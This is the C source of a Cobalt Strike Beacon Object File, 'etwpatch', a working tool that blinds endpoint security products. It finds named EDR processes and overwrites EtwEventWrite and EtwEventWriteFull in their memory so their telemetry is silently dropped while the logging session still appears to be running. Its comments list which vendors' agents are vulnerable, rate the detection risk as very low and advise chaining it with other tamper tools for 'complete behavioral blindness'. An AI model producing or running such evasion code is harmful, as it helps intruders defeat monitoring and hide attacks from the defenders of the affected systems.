/*
 * etwpatch.bof.c — Beacon Object File
 *
 * ═══════════════════════════════════════════════════════════════════════════════
 * TẠI SAO ĐÂY LÀ KỸ THUẬT ELITE HƠN etw_tamper (session stop)?
 * WHY THIS IS MORE ELITE THAN SESSION STOP (etw_tamper)
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 *   etw_tamper (session stop):
 *     ControlTraceW(..., EVENT_TRACE_CONTROL_STOP)
 *     → Session is DESTROYED
 *     → logman shows session as STOPPED
 *     → Windows Operational log: "ETW session stopped" event
 *     → EDR console: "sensor disconnected" alert within minutes
 *     → SOC sees the session teardown
 *     Detection profile: MEDIUM-HIGH
 *
 *   etwpatch (this BOF):
 *     WriteProcessMemory → patch EtwEventWrite with xor eax,eax; ret
 *     → Session is STILL RUNNING (logman shows "Running", consumer active)
 *     → EDR process THINKS it's writing events (EtwEventWrite returns 0 = success)
 *     → Events are silently discarded at the function entry point
 *     → No "session stopped" event
 *     → No SOC alert from ETW infrastructure
 *     Detection profile: VERY LOW
 *
 * ═══════════════════════════════════════════════════════════════════════════════
 * CƠ CHẾ — HOW THE PATCH WORKS
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * EDR ETW write path (any process):
 *
 *   EDR code → EventWrite(hReg, event) → ntdll!EtwEventWrite()
 *                                              │
 *                                         [WE PATCH HERE]
 *                                              │
 *                                        (normally continues to kernel)
 *                                              │
 *                                        ETW session buffer → consumer
 *
 * What we install at EtwEventWrite function entry (3 bytes):
 *
 *   BEFORE (normal ntdll x64 function prologue):
 *     4C 8B DC    mov r11, rsp     ← first 3 bytes
 *     49 89 53 10 mov [r11+10h], rdx
 *     ...
 *
 *   AFTER (our patch):
 *     33 C0       xor eax, eax    ← return STATUS_SUCCESS (0)
 *     C3          ret              ← return immediately
 *     <remaining original bytes untouched, never executed>
 *
 * EtwEventWrite returns STATUS_SUCCESS (0x00000000) to the EDR caller.
 * The EDR code sees success and proceeds normally — completely unaware that
 * no event was written. The kernel ETW subsystem was never reached.
 *
 * ═══════════════════════════════════════════════════════════════════════════════
 * ntdll ASLR — WHY THE ADDRESS IS THE SAME IN ALL PROCESSES
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * Windows uses IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (ASLR) for system DLLs,
 * BUT: the randomization is applied ONCE at boot time, not per-process.
 * All running processes share identical virtual addresses for system DLLs
 * (ntdll.dll, kernel32.dll, etc.) for the lifetime of the boot session.
 *
 * Consequence: the address of EtwEventWrite obtained via GetProcAddress in
 * OUR process is IDENTICAL to its address in the TARGET process.
 *
 * When WriteProcessMemory writes to that address in the target:
 *   → Copy-on-Write (CoW) creates a PRIVATE copy of the ntdll page
 *   → Only the TARGET process is affected
 *   → Our process's ntdll remains unpatched (we can read original bytes from it)
 *   → Other processes' ntdll remains unpatched
 *
 * ═══════════════════════════════════════════════════════════════════════════════
 * PPL LIMITATION — QUAN TRỌNG
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * PPL (Protected Process Light) processes block WriteProcessMemory from
 * non-PPL callers — even SYSTEM. This affects:
 *
 *   PROTECTED (PPL) — etwpatch CANNOT patch these:
 *     MsSense.exe (Microsoft Defender for Endpoint)
 *     CSFalconService.exe (CrowdStrike Falcon, most configurations)
 *     MsMpEng.exe (Windows Defender)
 *
 *   NOT PPL — etwpatch WORKS:
 *     elastic-agent.exe / elastic-endpoint.exe (Elastic Security)
 *     CbDefense.exe (Carbon Black)
 *     SentinelAgent.exe (SentinelOne — most configurations)
 *     Older versions of CrowdStrike sensor
 *     Any EDR that does not run as PPL
 *
 * Check at runtime: OpenProcess(PROCESS_VM_WRITE) fails with ERROR_ACCESS_DENIED
 * for PPL processes → etwpatch detects this and reports "PPL protected — use
 * etw_tamper session stop instead".
 *
 * ═══════════════════════════════════════════════════════════════════════════════
 * WHAT IS STILL CAPTURED EVEN WITH PATCH
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * The EtwEventWrite patch ONLY silences user-mode ETW writes from the patched
 * process. It does NOT stop:
 *   - Kernel callbacks: PsSetCreateProcessNotifyRoutine (runs in kernel)
 *   - Minifilter IRP callbacks (runs in kernel filter stack)
 *   - Kernel providers writing to separate sessions (other processes)
 *
 * For complete behavioral blindness, combine:
 *   etwpatch <edr_procs>          ← silence user-mode ETW from EDR
 *   etw_tamper <sessions>         ← kill kernel ETW sessions (for PPL or kernel providers)
 *   edrchoker <edr_procs>         ← block network upload even if capture succeeds
 *
 * ═══════════════════════════════════════════════════════════════════════════════
 * MODES
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 *   0 — PATCH:   patch EtwEventWrite + EtwEventWriteFull in named process(es)
 *   1 — RESTORE: write original bytes back from our local ntdll (CoW reversal)
 *   2 — CHECK:   probe named process(es) for PPL status and patch state
 *
 * ═══════════════════════════════════════════════════════════════════════════════
 * COMPILATION
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 *   mingw64: x86_64-w64-mingw32-gcc -o etwpatch.x64.o -c etwpatch.bof.c -masm=intel
 *   MSVC:    cl /c /TC /GS- /Foetwpatch.x64.obj etwpatch.bof.c
 *
 *   beacon.h: https://github.com/trustedsec/CS-Situational-Awareness-BOF
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────────── */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT void*   WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);

/* ═══════════════════════════════════════════════════════════════════════════════
 * CONSTANTS
 * ═══════════════════════════════════════════════════════════════════════════════ */

/* x64 patch: xor eax, eax (33 C0) + ret (C3) = 3 bytes
 * Returns STATUS_SUCCESS (0) to caller — EDR sees success, nothing is written  */
static const BYTE g_Patch[3] = { 0x33, 0xC0, 0xC3 };

/* PROCESS_VM access rights needed for WriteProcessMemory */
#define PROC_VM_RIGHTS (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION)

/* ═══════════════════════════════════════════════════════════════════════════════
 * HELPER FUNCTIONS
 * ═══════════════════════════════════════════════════════════════════════════════ */

/* Inline wchar_t tokenizer — no CRT wcstok needed. Splits on ';'. */
static wchar_t* WNextTok(wchar_t** cursor) {
    wchar_t* start = *cursor;
    if (!start || *start == L'\0') return NULL;
    while (*start == L';') start++;
    if (*start == L'\0') { *cursor = start; return NULL; }
    wchar_t* p = start;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *cursor = p + 1; }
    else            { *cursor = p; }
    return start;
}

/* Case-insensitive wide string compare */
static BOOL WEqI(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ac = *a, bc = *b;
        if (ac >= L'A' && ac <= L'Z') ac += 32;
        if (bc >= L'A' && bc <= L'Z') bc += 32;
        if (ac != bc) return FALSE;
        a++; b++;
    }
    return *a == L'\0' && *b == L'\0';
}

/* wchar_t string length without CRT */
static int WLen(const wchar_t* s) { int n = 0; while (s[n]) n++; return n; }

/* ZeroMem — avoids RtlZeroMemory DLL dependency issue */
static void ZeroMem(void* p, SIZE_T n) {
    volatile char* v = (volatile char*)p;
    SIZE_T i;
    for (i = 0; i < n; i++) v[i] = 0;
}

/* Print 3 hex bytes in format "[XX YY ZZ]" */
static void PrintBytes(const BYTE* b) {
    static const char hex[] = "0123456789ABCDEF";
    char s[12] = "[XX YY ZZ]";
    s[1] = hex[(b[0]>>4)&0xF]; s[2] = hex[b[0]&0xF];
    s[4] = hex[(b[1]>>4)&0xF]; s[5] = hex[b[1]&0xF];
    s[7] = hex[(b[2]>>4)&0xF]; s[8] = hex[b[2]&0xF];
    BeaconPrintf(CALLBACK_OUTPUT, "%s", s);
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * PROCESS ENUMERATION — find all PIDs for a given exe name
 * ═══════════════════════════════════════════════════════════════════════════════ */

#define MAX_PIDS 32

/* Returns number of PIDs found. pids[] is caller-provided array of size MAX_PIDS. */
static int FindPidsByName(const wchar_t* exeName, DWORD* pids, int maxPids) {
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] CreateToolhelp32Snapshot failed: %lu\n",
            KERNEL32$GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe;
    ZeroMem(&pe, sizeof(pe));
    pe.dwSize = sizeof(PROCESSENTRY32W);

    int count = 0;
    if (KERNEL32$Process32FirstW(hSnap, &pe)) {
        do {
            if (WEqI(pe.szExeFile, exeName) && count < maxPids) {
                pids[count++] = pe.th32ProcessID;
            }
        } while (KERNEL32$Process32NextW(hSnap, &pe));
    }
    KERNEL32$CloseHandle(hSnap);
    return count;
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * CORE PATCH / RESTORE / CHECK OPERATIONS
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * PatchOrRestore — apply or remove the EtwEventWrite NOP patch in one PID.
 *
 * doPatch = TRUE  → write g_Patch bytes (xor eax,eax; ret)
 * doPatch = FALSE → write original bytes from OUR local ntdll (CoW safe)
 *
 * For each target function:
 *   1. Get function address from our ntdll (same VA in target due to boot-ASLR)
 *   2. VirtualProtectEx to PAGE_EXECUTE_READWRITE
 *   3. Write 3 bytes
 *   4. VirtualProtectEx to restore original protection
 *
 * Returns TRUE if at least one function was patched/restored successfully.
 */
static BOOL PatchOrRestore(DWORD pid, BOOL doPatch) {
    /* Get function addresses from OUR ntdll (same VA in target process) */
    HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "  [!] GetModuleHandleW(ntdll) failed: %lu\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }

    /* Two functions to patch:
     *   EtwEventWrite     — primary path for EventWrite()
     *   EtwEventWriteFull — called by some providers directly for full-featured events */
    struct { const char* name; FARPROC addr; } funcs[2];
    funcs[0].name = "EtwEventWrite";
    funcs[0].addr = KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite");
    funcs[1].name = "EtwEventWriteFull";
    funcs[1].addr = KERNEL32$GetProcAddress(hNtdll, "EtwEventWriteFull");

    if (!funcs[0].addr) {
        BeaconPrintf(CALLBACK_ERROR, "  [!] EtwEventWrite not found in ntdll\n");
        return FALSE;
    }

    /* Open target process with VM write access */
    HANDLE hProc = KERNEL32$OpenProcess(PROC_VM_RIGHTS, FALSE, pid);
    if (!hProc) {
        DWORD err = KERNEL32$GetLastError();
        if (err == ERROR_ACCESS_DENIED) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [-] PID %lu: ACCESS DENIED — process is PPL-protected\n"
                "      MDE, CrowdStrike Falcon, Windows Defender run as PPL.\n"
                "      Use 'etw_tamper' (session stop) for PPL EDR processes instead.\n",
                pid);
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "  [-] PID %lu: OpenProcess failed: %lu\n", pid, err);
        }
        return FALSE;
    }

    BOOL anySuccess = FALSE;

    for (int fi = 0; fi < 2; fi++) {
        if (!funcs[fi].addr) continue;  /* EtwEventWriteFull might not exist on some builds */

        void* pFunc = (void*)funcs[fi].addr;

        /* Read current bytes at target for display */
        BYTE currentBytes[3];
        ZeroMem(currentBytes, 3);
        SIZE_T bytesRead = 0;
        KERNEL32$ReadProcessMemory(hProc, pFunc, currentBytes, 3, &bytesRead);

        /* Check if already in desired state */
        BOOL alreadyPatched = (currentBytes[0] == g_Patch[0] &&
                               currentBytes[1] == g_Patch[1] &&
                               currentBytes[2] == g_Patch[2]);

        if (doPatch && alreadyPatched) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [=] PID %lu: %s already patched — skipping\n",
                pid, funcs[fi].name);
            anySuccess = TRUE;
            continue;
        }
        if (!doPatch && !alreadyPatched) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [=] PID %lu: %s not patched — nothing to restore\n",
                pid, funcs[fi].name);
            continue;
        }

        /* What bytes to write */
        const BYTE* writeBytes;
        BYTE origBytes[3];
        if (doPatch) {
            writeBytes = g_Patch;
        } else {
            /* Restore: read original bytes from OUR local ntdll (unpatched via CoW) */
            KERNEL32$RtlMoveMemory(origBytes, pFunc, 3);
            writeBytes = origBytes;
        }

        /* Make page writable */
        DWORD oldProt = 0;
        if (!KERNEL32$VirtualProtectEx(hProc, pFunc, 3, PAGE_EXECUTE_READWRITE, &oldProt)) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [-] PID %lu: VirtualProtectEx(%s) failed: %lu\n",
                pid, funcs[fi].name, KERNEL32$GetLastError());
            continue;
        }

        /* Write the patch/restore bytes */
        SIZE_T written = 0;
        BOOL ok = KERNEL32$WriteProcessMemory(hProc, pFunc, writeBytes, 3, &written);

        /* Restore original protection */
        DWORD tmp = 0;
        KERNEL32$VirtualProtectEx(hProc, pFunc, 3, oldProt, &tmp);

        if (ok && written == 3) {
            if (doPatch) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [+] PID %lu: %s PATCHED\n"
                    "      Before: [%02X %02X %02X]  After: [33 C0 C3] (xor eax,eax; ret)\n"
                    "      All ETW writes from this process now silently return STATUS_SUCCESS\n"
                    "      ETW session still shows 'Running' — zero operational trace\n",
                    pid, funcs[fi].name,
                    currentBytes[0], currentBytes[1], currentBytes[2]);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [+] PID %lu: %s RESTORED\n"
                    "      Bytes: [%02X %02X %02X] written back\n",
                    pid, funcs[fi].name,
                    writeBytes[0], writeBytes[1], writeBytes[2]);
            }
            anySuccess = TRUE;
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "  [-] PID %lu: WriteProcessMemory(%s) failed: %lu (wrote %zu/3 bytes)\n",
                pid, funcs[fi].name, KERNEL32$GetLastError(), written);
        }
    }

    KERNEL32$CloseHandle(hProc);
    return anySuccess;
}

/*
 * CheckProcess — probe one PID for PPL status and patch state.
 * Does not modify the process.
 */
static void CheckProcess(DWORD pid, const wchar_t* name) {
    /* Try to open with VM_WRITE to probe PPL */
    HANDLE hWrite = KERNEL32$OpenProcess(PROC_VM_RIGHTS, FALSE, pid);
    BOOL isPpl = (hWrite == NULL && KERNEL32$GetLastError() == ERROR_ACCESS_DENIED);

    /* Try read-only for patch state check */
    HANDLE hRead = hWrite;
    if (!hWrite) {
        hRead = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    }

    if (isPpl) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [PPL] PID %lu (%S) — PPL protected\n"
            "        etwpatch CANNOT patch this process\n"
            "        Use: etw_tamper (session stop) for this EDR\n",
            pid, name);
    }

    if (hRead) {
        HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
        FARPROC pEtw = hNtdll ? KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite") : NULL;

        if (pEtw) {
            BYTE curr[3] = {0};
            SIZE_T nRead = 0;
            KERNEL32$ReadProcessMemory(hRead, (void*)pEtw, curr, 3, &nRead);

            BOOL patched = (curr[0] == 0x33 && curr[1] == 0xC0 && curr[2] == 0xC3);
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [%s] PID %lu (%S): EtwEventWrite bytes [%02X %02X %02X] — %s\n",
                isPpl ? "PPL" : "OK ",
                pid, name,
                curr[0], curr[1], curr[2],
                patched ? "ALREADY PATCHED" : (isPpl ? "not patched (PPL, use etw_tamper)" : "not patched (ready to patch)"));
        }

        if (hWrite != hRead) KERNEL32$CloseHandle(hRead);
    } else if (!isPpl) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] PID %lu: cannot open for read either: %lu\n",
            pid, KERNEL32$GetLastError());
    }

    if (hWrite) KERNEL32$CloseHandle(hWrite);
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * Argument format (packed by CNA with bof_pack("iZ", mode, procs)):
 *
 *   [int32] mode
 *     0 = PATCH:   install EtwEventWrite NOP patch in named process(es)
 *     1 = RESTORE: write original bytes back (undo patch)
 *     2 = CHECK:   probe processes for PPL status and current patch state
 *
 *   [wchar_t* Z] procs
 *     Semicolon-separated process exe names, e.g.:
 *     "elastic-agent.exe;SentinelAgent.exe;CbDefense.exe"
 *
 * Privilege requirement:
 *   Non-PPL process → elevated Admin + SeDebugPrivilege (usually default for Admin)
 *   PPL process → CANNOT patch, use etw_tamper instead
 *
 * IMPORTANT:
 *   This patches the PROCESS's copy of ntdll (copy-on-write). NOT system-wide.
 *   If the EDR process restarts, the patch is gone — needs to be reapplied.
 *   The WMI watchdog in edrchoker can auto-reapply QoS but not this patch.
 *   Consider pairing with edrchoker to throttle network so even if EDR restarts
 *   and patch is gone, it still cannot upload telemetry.
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    LONG     mode    = BeaconDataInt(&parser);
    int      argBytes = 0;
    wchar_t* rawArg  = (wchar_t*)BeaconDataExtract(&parser, &argBytes);

    wchar_t buf[2048];
    int i;
    for (i = 0; i < 2048; i++) buf[i] = L'\0';
    if (rawArg && argBytes > 2) {
        int n = argBytes / (int)sizeof(wchar_t);
        if (n >= 2048) n = 2047;
        KERNEL32$RtlMoveMemory(buf, rawArg, n * sizeof(wchar_t));
        buf[n] = L'\0';
    }

    if (!buf[0]) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No process list provided.\n"
            "    Usage: etwpatch elastic-agent.exe;SentinelAgent.exe\n"
            "    Mode 0=patch, 1=restore, 2=check\n");
        return;
    }

    /* Verb for mode */
    const char* verb = (mode == 0) ? "PATCH" : (mode == 1) ? "RESTORE" : "CHECK";

    /* Count procs */
    wchar_t countBuf[2048];
    KERNEL32$RtlMoveMemory(countBuf, buf, sizeof(wchar_t) * 2047);
    countBuf[2047] = L'\0';
    int total = 0;
    wchar_t* cc = countBuf;
    while (WNextTok(&cc) != NULL) total++;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] EtwPatch: %s EtwEventWrite in %d process(es)...\n",
        verb, total);

    if (mode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "    Technique: WriteProcessMemory → patch with [33 C0 C3] (xor eax,eax; ret)\n"
            "    Effect: EDR ETW writes return success but write nothing\n"
            "    ETW session remains Running — no session stop event generated\n\n");
    }

    int ok = 0, fail = 0, ppl = 0;

    wchar_t workBuf[2048];
    KERNEL32$RtlMoveMemory(workBuf, buf, sizeof(wchar_t) * 2047);
    workBuf[2047] = L'\0';
    wchar_t* cursor = workBuf;
    wchar_t* tok;

    while ((tok = WNextTok(&cursor)) != NULL) {
        DWORD pids[MAX_PIDS];
        int found = FindPidsByName(tok, pids, MAX_PIDS);

        if (found == 0) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [~] '%S' — not running (no PID found)\n", tok);
            continue;
        }

        for (int pi = 0; pi < found; pi++) {
            DWORD pid = pids[pi];

            if (mode == 2) {
                CheckProcess(pid, tok);
                ok++;
                continue;
            }

            /* Probe PPL before attempting patch */
            HANDLE hProbe = KERNEL32$OpenProcess(PROC_VM_RIGHTS, FALSE, pid);
            if (!hProbe && KERNEL32$GetLastError() == ERROR_ACCESS_DENIED) {
                ppl++;
                BeaconPrintf(CALLBACK_ERROR,
                    "  [-] PID %lu (%S): PPL-protected — WriteProcessMemory not allowed\n"
                    "      → Fallback: use 'etw_tamper %S' (session stop works for PPL)\n",
                    pid, tok, tok);
                fail++;
                continue;
            }
            if (hProbe) KERNEL32$CloseHandle(hProbe);

            BOOL result = PatchOrRestore(pid, (mode == 0));
            if (result) ok++;
            else        fail++;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[*] RESULT: %d process(es) %s successfully",
        ok, (mode == 0) ? "patched" : (mode == 1) ? "restored" : "checked");
    if (fail > 0)
        BeaconPrintf(CALLBACK_ERROR,
            " | %d failed (%d PPL-protected)", fail, ppl);
    BeaconPrintf(CALLBACK_OUTPUT, "\n");

    if (mode == 0 && ok > 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n    Verify: run 'etwpatch check <proc>' to confirm patch state\n"
            "    Stealth check: logman query | findstr /i \"Running\"\n"
            "      → Session still shows Running (no teardown alert)\n"
            "    NOTE: patch lost if EDR process restarts. Combine with:\n"
            "      edrchoker <proc>   ← QoS cap as persistent failsafe\n"
            "      etw_tamper <sess>  ← session stop for kernel-level events\n");
    }
}
